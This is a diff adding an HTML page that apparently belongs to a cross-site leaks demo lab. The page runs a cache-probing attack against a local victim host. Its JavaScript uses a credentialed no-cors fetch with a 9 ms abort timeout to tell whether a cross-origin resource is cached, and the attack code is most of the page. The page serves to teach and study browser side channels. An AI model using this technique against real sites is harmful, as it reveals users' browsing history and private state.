@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSLL - Attacker - Cache Probing</title>
+</head>
+
+<body>
+    <h1>Cache Probing</h1>
+    <ul>
+        <li><a href="../index.html">Home</a></li>
+    </ul>
+
+    <h2>Introduction</h2>
+    <p>This page will help demonstrate a Cache Probing attack.</p>
+    <h2>Attack</h2>
+    <p>Start the attack by clicking the button below.</p>
+    <p>The attack will leak whether <a href="http://victim.local:27182/xs-leaks/cache-probing.html">this</a> resource is
+        cached.</p>
+    <ol>
+        <li>Check whether resource is cached.</li>
+        <li>Load resource to cache (might take some time).</li>
+        <li>Check whether resource is cache.</li>
+        <li>(Clear cache (on Brave) here: "brave://settings/clearBrowserData?search=cache"</a>.)</li>
+    </ol>
+
+    <button id="check-button">Check Resource Cache</button>
+    <button id="open-button">Load Resource to Cache</button>
+    <div id=message></div>
+    <script>
+        async function ifCached(url) {
+            var controller = new AbortController();
+            var signal = controller.signal;
+            var timeout = setTimeout(() => {
+                controller.abort();
+            }, 9);
+            try {
+                let options = {
+                    mode: "no-cors",
+                    credentials: "include",
+                    signal: signal
+                };
+                await fetch(url, options);
+            } catch (err) {
+                console.log("The resource is not cached");
+                document.getElementById('message').textContent = "The resource is not cached";
+                return false;
+            }
+            clearTimeout(timeout);
+            console.log("The resource is cached");
+            document.getElementById('message').textContent = "The resource is cached";
+            return true;
+        }
+
+        document.getElementById('open-button').addEventListener('click', async () => {
+            const url = 'http://victim.local:27182/xs-leaks/cache-probing.html';
+            window.open(url, '_blank');
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            console.log("Resource opened and cached");
+            document.getElementById('message').textContent = "Resource opened and cached";
+        });
+
+        document.getElementById('check-button').addEventListener('click', async () => {
+            const url = 'http://victim.local:27182/xs-leaks/cache-probing.html';
+            await ifCached(url);
+        });
+    </script>
+</body>
+
+</html>
